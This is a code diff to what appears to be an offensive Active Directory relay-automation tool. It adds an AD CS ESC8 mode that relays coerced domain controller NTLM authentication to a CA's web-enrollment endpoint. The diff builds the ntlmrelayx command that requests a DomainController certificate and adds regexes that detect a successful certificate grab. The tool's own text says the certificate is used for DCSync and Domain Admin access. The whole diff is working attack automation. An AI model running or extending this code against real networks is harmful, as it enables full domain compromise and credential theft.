@@ -36,6 +36,7 @@ class RelayMode(enum.Enum):
     LDAP_RBCD = "ldap-rbcd"           # relay to LDAP(S) -> configure RBCD
     LDAP_SHADOW = "ldap-shadow"       # relay to LDAP(S) -> add shadow credentials
     REFLECTION = "reflection"         # relay coerced auth back to the same host (SMB)
+    ADCS_ESC8 = "adcs-esc8"           # relay to AD CS web enrollment -> DC cert
 
     @property
     def description(self) -> str:
@@ -52,6 +53,11 @@ class RelayMode(enum.Enum):
                 "Reflect coerced authentication back to the originating host "
                 "over SMB for local administrator access (self-relay)."
             ),
+            RelayMode.ADCS_ESC8: (
+                "Relay coerced DC authentication to the AD CS HTTP web-enrollment "
+                "endpoint (ESC8) to obtain a Domain Controller certificate, which "
+                "authenticates as the DC for DCSync / Domain Admin."
+            ),
         }[self]
 
     @property
@@ -60,6 +66,7 @@ class RelayMode(enum.Enum):
             RelayMode.LDAP_RBCD: Capability.RBCD,
             RelayMode.LDAP_SHADOW: Capability.RESET_PASSWORD,
             RelayMode.REFLECTION: Capability.LOCAL_ADMIN,
+            RelayMode.ADCS_ESC8: Capability.CERT_AS_DA,
         }[self]
 
 
@@ -78,7 +85,10 @@ _RELAY_SUCCESS = re.compile(
     r"Attribute msDS-AllowedToActOnBehalfOfOtherIdentity|"
     r"KeyCredential|Shadow credential|"
     r"Dumping domain info|Enumerating relayed user|"
-    r"was set successfully|SMBD-Thread.*Authenticating",
+    r"was set successfully|SMBD-Thread.*Authenticating|"
+    # ESC8 / AD CS: ntlmrelayx prints the base64 cert or a 'GOT CERTIFICATE' line.
+    r"GOT CERTIFICATE|Base64 certificate|Writing PKCS#?12|"
+    r"Requesting certificate|successfully requested",
     re.IGNORECASE,
 )
 
@@ -161,6 +171,8 @@ class RelayOrchestrator:
             missing.append("victim host to coerce")
         if mode in (RelayMode.LDAP_RBCD, RelayMode.LDAP_SHADOW) and not relay_target:
             missing.append("relay target (DC for LDAP relay)")
+        if mode is RelayMode.ADCS_ESC8 and not relay_target:
+            missing.append("relay target (CA host for ESC8 web enrollment)")
         if mode is RelayMode.REFLECTION and not relay_target:
             # For reflection the relay target is the victim itself.
             relay_target = victim
@@ -205,6 +217,16 @@ class RelayOrchestrator:
                 "--shadow-credentials",
                 "--no-dump",
                 "-smb2support",
+            ]
+        if mode is RelayMode.ADCS_ESC8:
+            # Relay to the CA's HTTP web-enrollment endpoint and request a
+            # DomainController cert for the coerced DC machine account.
+            return [
+                "ntlmrelayx.py",
+                "-t", _esc8_target(relay_target),
+                "-smb2support",
+                "--adcs",
+                "--template", "DomainController",
             ]
         # REFLECTION: relay back to the same host over SMB.
         return [
@@ -369,3 +391,17 @@ def _authstring(domain: str, user: str, password: str, victim: str) -> str:
     if password:
         creds += f":{password}"
     return f"{prefix}{creds}@{victim}"
+
+
+def _esc8_target(relay_target: str) -> str:
+    """Build the ntlmrelayx target URL for the AD CS web-enrollment endpoint.
+
+    Accepts either a bare CA host (``ca01.corp.local``) - in which case the
+    standard certsrv enrollment path is appended - or a value the operator has
+    already written as a full ``http(s)://.../certsrv/...`` URL, which is passed
+    through untouched.
+    """
+    tgt = relay_target.strip()
+    if tgt.lower().startswith(("http://", "https://")):
+        return tgt
+    return f"http://{tgt}/certsrv/certfnsh.asp"
